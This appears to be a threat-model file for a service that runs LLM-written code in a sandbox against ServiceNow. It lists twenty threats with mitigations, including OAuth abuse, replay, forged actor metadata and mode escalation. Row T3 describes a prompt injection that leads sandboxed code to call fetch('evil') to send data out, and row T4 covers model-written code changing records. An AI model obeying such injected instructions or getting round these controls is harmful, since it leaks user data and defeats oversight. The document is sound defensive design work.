# Threat model

Security threats and their mitigations (distinct from the build-time risk register). This is the
canonical T1–T20 table; the architecture it defends is in [`DESIGN.md`](DESIGN.md). The host-side
mitigations (authorization, isolation, cost, redaction, idempotency, audit, recovery, KEK rotation,
OAuth) are wired into the live request path and covered by the test suite; the ServiceNow-side
executor controls are exercised live by `scripts/executor-scoped-verify.mjs` against a real instance
(the local suite cannot reach a live instance — see [`DESIGN.md`](DESIGN.md) § *Testing model*).

| # | Threat | Impact | Mitigation |
|---|---|---|---|
| T1 | Stolen Cloudflare account / API token | Read encrypted DO storage; redeploy the Worker | Tokens AES-GCM encrypted in a versioned, AAD-bound envelope; KEK in a Cloudflare secret; Access + IP allow-list on the deploy path; rotate keys |
| T2 | Stolen ServiceNow refresh token | Reach the user's surface in ServiceNow | Partition tokens per `(user, instance)` in `TokenStoreDO`; short access-token lifetimes; fail closed on AAD mismatch |
| T3 | Prompt-injection makes sandboxed code call `fetch("evil")` | Data exfiltration | `globalOutbound: null` makes `fetch()`/`connect()` **throw** in the sandbox; no creds in the sandbox `env`, only the typed RPC binding |
| T4 | LLM-written code mutates records | Unintended writes | Capability is intentional; mitigation is **attributive + recoverable**: every mutating RPC records `(mcp_actor, snow_effective_user, table, sys_id, op, before/after-hash, requestId)` under a **verified** actor; effective-mode gate + `ActorPolicy` + idempotency ledger + audit-before-effect + recovery snapshot + approval gate |
| T5 | Sensitive output bleeds into Cloudflare logs / Tail | PII in the observability stream | Redactor denylist fields + token patterns; never log script body or full RPC response; audit stores hashes only; redacted client errors |
| T6 | Over-broad role on the integration user | Defeats the role matrix | Role matrix (`ROLE_MATRIX.md`); never reuse a human admin; one-click rotate-executor-role runbook; the executor role is decoupled from Table reach |
| T7 | Schema cache leaks fields across users | Cross-role metadata disclosure | **User-aware** cache key (ServiceNow `userSysId` + content-addressed `roleHash`); short TTL; a missing per-user sys_id bypasses the cache rather than sharing it |
| T8 | Replay of an MCP request or executor call | Duplicated side effects; forged-actor reuse | **Leveled** idempotency in `MutationLedgerDO` (L1 replays return the original; L2 `indeterminate` retry blocked); the executor **nonce** is consumed via INSERT-as-arbiter against a **DB unique index** |
| T9 | PDI hibernation / reclamation mid-flight | Hangs, half-applied changes | PDIs dev/demo only; `/health` probe; typed `instance_hibernating` instead of hanging |
| T10 | Dynamic Worker pricing (workers **and** requests **and** CPU) | Cost explosion from runaway workers, or one cheap Worker making many calls | **Multi-dimensional atomic reserve-before-load** in `BudgetDO` (reserves per-run max, refunds unused); **enforced per-run** row/byte caps; daily hard breaker |
| T11 | MCP SDK cross-client response leak (CVE) | One client sees another's responses | Construct `McpServer`/transport **per request** |
| T12 | Endpoint exposed publicly | Anyone invokes `run_code` | Production `/mcp` requires a valid MCP-client token (audience/issuer/scope) **before** tool invocation; unauthenticated `/mcp` → 401; `OAUTH_KV` fail-closed |
| T13 | DNS rebinding via missing Origin validation | Cross-origin invocation | Reject invalid `Origin` (403) on **both** `/mcp` and the auth surface; `allowLocalhost` env-gated for dev |
| T14 | OAuth flow abuse (redirect / state / PKCE / consent / OIDC callback) | Confused-deputy, token theft | Exact `redirect_uri` match, state/nonce, PKCE `S256` (`allowPlainPKCE:false`); signed single-use consent nonce; OIDC callback validates issuer/audience/alg/nonce and consumes state once; GET `/authorize` rejects unknown clients and rate-caps consent writes per **source IP** (`ConsentRateDO`) so dynamic client registration can't multiply keys |
| T15 | **Forged actor metadata** (a caller fabricates `body.actor`) | False attribution; accountability bypass | Host **HMAC-signs** an ASCII-canonical payload (with `reason` as the **last** key); the executor **verifies** (freshness + single-use nonce + instance claim, fail-closed); `actor_verified` audited |
| T16 | **Mode escalation** via the `mode` tool input | Unauthorized writes / arbitrary script | `effectiveMode = min(requested, scope, tenant, instance)`; an **unknown mode → maximum risk (fail-closed)**; `admin_script` needs allowlist + approval |
| T17 | **`integration_user` over-reads** for a given user | Confidential data disclosure (audit ≠ access control) | `ActorPolicy` (instances/tables/fields/rows) before every RPC; OIDC groups may select named ActorPolicies; mandatory row filter AND-ed into reads **including `tableGet`** and write preflight; field masks checked on query **predicates**, not just fields/rows; or `per_user_oauth` |
| T18 | **`scriptedRest` bypasses `runServerScript()`** | Ungated/unaudited executor reach | No generic scripted-REST RPC exists; the executor is reachable only via `runServerScript()`; any future generic adapter must deny executor/config/audit/OAuth paths |
| T19 | **ServiceNow-side egress** via `runServerScript` | Server-side script calls SN outbound / email / events / records | Tenant `run_server_script_enabled` toggle (fail-closed on **either** property namespace) + `reason` + approval for `admin_script` + non-recoverable label + host audit/ledger/snapshot wrap; the executor `execute()` is cap-gated to the consumed nonce |
| T20 | **Recovery snapshot store** becomes a second sensitive DB | New PII exposure / over-retention | Retention window + dedicated `SNAPSHOT_KEK` (AES-256-GCM) + admin-only decrypt + KV auto-expiry + PII classification + explicit table enablement (`RETENTION.md`) |

**ServiceNow-side egress (T19) deserves its own emphasis.** `globalOutbound: null` is a
**Cloudflare-side** control; it says nothing about what a server-side script does **inside**
ServiceNow. Treat `runServerScript` as an egress-capable primitive: it can reach
`RESTMessageV2`/outbound integrations, fire events, send email, or move data between records. The
controls are organizational and tenant-scoped (toggle, approval, denylist scan, separate budget,
non-recoverable labeling), documented in [`SNOW_EGRESS.md`](SNOW_EGRESS.md) — not a sandbox.

**Forged actor metadata (T15) and integration_user over-reads (T17)** are why
[`DESIGN.md`](DESIGN.md) insists on host **sign-AND-verify** (a claimed `body.actor` is forgeable by
anyone holding the executor role) and on `ActorPolicy` gating every read (audit records disclosure;
it does not prevent it). Per-actor `maxMode` is re-checked at the `runServerScript` sink, not
inherited.
